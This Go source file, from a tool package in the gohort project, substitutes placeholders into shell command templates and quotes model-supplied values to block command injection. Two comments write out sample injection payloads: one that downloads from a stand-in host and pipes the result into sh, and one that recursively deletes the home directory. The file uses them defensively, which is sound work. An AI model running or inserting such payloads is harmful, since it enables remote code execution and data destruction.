package temptool

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"

	. "github.com/cmcoffee/gohort/core"
)

// isPlaceholderIdent reports whether s is shaped like a Go-style
// identifier — letters/digits/underscores, must start with a letter
// or underscore. Mirrors the implicit shape `substitute` uses when
// it decides whether to honor a `{...}` as a placeholder. Empty
// strings and JSON-shaped strings (containing spaces, quotes, colons,
// commas, brackets) return false.
// urlEncodeModifiers are the encodings a URL placeholder may ask for by
// name, as "{path:encoded}".
//
// One exists, and it exists because without it a nested path could not
// be expressed AT ALL for an API that wants the whole thing as a single
// segment. GitLab's files endpoint is the case that found this: the
// default keeps "/" raw (a CalDAV calendar path and a /repos/owner/name
// must substitute as real separators), so the caller reaches for a
// pre-encoded "%2F" — and the escaper turns the "%" into "%25", giving
// "src%252Fhandlers%252Fwebhook_retry.py". Both values 404, and the
// tool's description suggests both. There was no third thing to try.
//
// Two spellings for the same encoding: an author reaching for this is
// guessing, and both guesses are reasonable.
var urlEncodeModifiers = map[string]bool{"encoded": true, "segment": true}

// splitPlaceholder splits "name:modifier" into its parts. No colon means
// no modifier, which is every placeholder written before this existed.
func splitPlaceholder(s string) (name, modifier string) {
	if i := strings.IndexByte(s, ':'); i >= 0 {
		return s[:i], s[i+1:]
	}
	return s, ""
}

func isPlaceholderIdent(s string) bool {
	if s == "" {
		return false
	}
	for i, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r == '_':
			// always allowed
		case r >= '0' && r <= '9':
			if i == 0 {
				return false
			}
		default:
			return false
		}
	}
	return true
}

// substitute replaces {name} placeholders in cmd with shell-quoted arg
// values. Unknown args (placeholders without a corresponding key in
// args) result in an error rather than silent dropping.
func substitute(cmd string, params map[string]ToolParam, args map[string]any) (string, error) {
	var b strings.Builder
	for i := 0; i < len(cmd); i++ {
		if cmd[i] != '{' {
			b.WriteByte(cmd[i])
			continue
		}
		end := strings.IndexByte(cmd[i+1:], '}')
		if end < 0 {
			b.WriteByte(cmd[i])
			continue
		}
		name, _ := splitPlaceholder(cmd[i+1 : i+1+end])
		if _, known := params[name]; !known {
			// Not a placeholder we recognize — emit verbatim so the
			// LLM can use literal braces in its command if needed.
			b.WriteByte(cmd[i])
			continue
		}
		// A modifier is URL-encoding syntax and means nothing to a
		// shell. Honour the base name anyway: the alternative is a
		// literal "{path:encoded}" reaching the command line, which is
		// a worse outcome than ignoring a hint that does not apply.
		val, ok := args[name]
		if !ok {
			return "", fmt.Errorf("missing arg %q", name)
		}
		// Bare (unquoted) only when the VALUE is a number or boolean, or a
		// string that is purely one ("1", "true": worker models pass numbers
		// as strings, and a script's int() then chokes on '1'). The declared
		// type used to be enough on its own, but the declaration is the
		// author's and the value is the model's: an "integer" param handed
		// "1; curl evil|sh" went into the command bare. A value that is not
		// literally a number or boolean is quoted, whatever it was declared.
		skipQuote := false
		switch v := val.(type) {
		case float64, float32, int, int64, int32, bool:
			skipQuote = true
		case string:
			skipQuote = looksLikeNumberLiteral(v) || looksLikeBoolLiteral(v)
		}
		if skipQuote {
			// Trimmed: " 1\n" parses as a number, and a bare newline would
			// end the command there and run the rest of the template alone.
			b.WriteString(strings.TrimSpace(stringify(val)))
		} else {
			b.WriteString(shellQuote(stringify(val)))
		}
		i = i + 1 + end
	}
	return b.String(), nil
}

// looksLikeNumberLiteral returns true when s parses cleanly as a
// JSON-style number (integer or decimal, optional leading sign). No
// shell metacharacters by definition; safe to emit bare. Used by
// substitute() to detect numeric strings the LLM passes in instead
// of native JSON numbers — common when the tool's param schema
// declares type="string" but the value is logically numeric.
func looksLikeNumberLiteral(s string) bool {
	s = strings.TrimSpace(s)
	if s == "" {
		return false
	}
	// strconv.ParseFloat accepts the JSON number grammar plus a bit
	// more (exponent forms, etc.) — all are safe to emit bare.
	_, err := strconv.ParseFloat(s, 64)
	return err == nil
}

// looksLikeBoolLiteral matches the canonical true/false literals.
// Case-sensitive: matches JSON / Python / Go convention.
func looksLikeBoolLiteral(s string) bool {
	s = strings.TrimSpace(s)
	return s == "true" || s == "false" || s == "True" || s == "False"
}

// stringify renders any JSON-decoded value as a string suitable for
// shell substitution. Numbers come back as float64 from json — we
// format them as integers when they're whole, decimals otherwise.
func stringify(v any) string {
	switch x := v.(type) {
	case string:
		return x
	case bool:
		if x {
			return "true"
		}
		return "false"
	case float64:
		if x == float64(int64(x)) {
			return fmt.Sprintf("%d", int64(x))
		}
		return fmt.Sprintf("%g", x)
	case nil:
		return ""
	default:
		// Last resort — let json represent it.
		b, _ := json.Marshal(v)
		return string(b)
	}
}

// shellQuote wraps s in single quotes, escaping any embedded single
// quotes via the standard `'\”` POSIX trick. Suitable for any sh
// shell. Critical for safety — without this, a placeholder value
// containing `; rm -rf $HOME` would execute as a command.
func shellQuote(s string) string {
	if s == "" {
		return "''"
	}
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}
